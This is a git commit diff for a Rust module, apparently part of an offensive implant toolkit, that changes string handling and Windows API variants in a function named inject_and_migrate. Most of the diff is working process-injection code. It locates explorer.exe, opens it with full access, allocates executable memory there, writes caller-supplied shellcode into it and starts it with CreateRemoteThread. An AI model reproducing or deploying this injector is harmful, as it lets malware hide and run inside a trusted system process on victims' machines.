de09c9d708fa5eb88096a4ba582c7d891661ceed
koins <koins@duck.com>
2022-01-19 09:56:22 -0800

    format strings, swap from win32 'W' calls to 'A' calls for consistency in workspace

--- process_migration/src/rco_process_migration_windows/mod.rs
+++ process_migration/src/rco_process_migration_windows/mod.rs
@@ -1,10 +1,8 @@
 extern crate windows;
 use std::{mem, ptr};
-use std::ffi::{OsString};
-use std::os::windows::ffi::OsStringExt;
-use windows::Win32::Foundation::INVALID_HANDLE_VALUE;
+use windows::Win32::Foundation::{CHAR, INVALID_HANDLE_VALUE};
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
-use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32NextW, TH32CS_SNAPPROCESS};
+use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, PROCESSENTRY32, Process32Next, TH32CS_SNAPPROCESS};
 use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx};
 use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};
 
@@ -12,7 +10,7 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     // Call CreateToolhelp32Snapshot to get a snapshot of all the processes currently running
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/ToolHelp/fn.CreateToolhelp32Snapshot.html
-    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0 as u32) };
+    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0_u32) };
     if snapshot == INVALID_HANDLE_VALUE {
         panic!("Could not obtain handle to snapshot");
     }
@@ -21,10 +19,17 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/ToolHelp/fn.Process32Next.html
     let mut pid: u32 = 0;
-    let mut process_entry: PROCESSENTRY32W = unsafe { mem::zeroed() };
-    process_entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
-    while unsafe {Process32NextW(snapshot, &mut process_entry).as_bool() } {
-        let process_name = OsString::from_wide(&process_entry.szExeFile).into_string().unwrap();
+    let mut process_entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
+    process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;
+    while unsafe { Process32Next(snapshot, &mut process_entry).as_bool() } {
+        let mut process_name = String::from("");
+        for element in process_entry.szExeFile {
+            let element_as_u8 = unsafe { mem::transmute::<CHAR, u8>(element) };
+            if element_as_u8 == 0 {
+                break
+            }
+            process_name.push(element_as_u8 as char);
+        }
         if process_name.contains("explorer.exe") {
             pid = process_entry.th32ProcessID;
             break;
@@ -47,7 +52,6 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     // Call WriteProcessMemory to write the contents of the shellcode into the memory allocated above
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
-    //let shellcode_c_void = shellcode.as_ptr() as *const c_void;
     let write_result = unsafe { WriteProcessMemory(explorer_handle, base_address, shellcode.as_ptr() as _, shellcode.len(), ptr::null_mut()) };
     if !write_result.as_bool() {
         panic!("WriteProcessMemory failed");
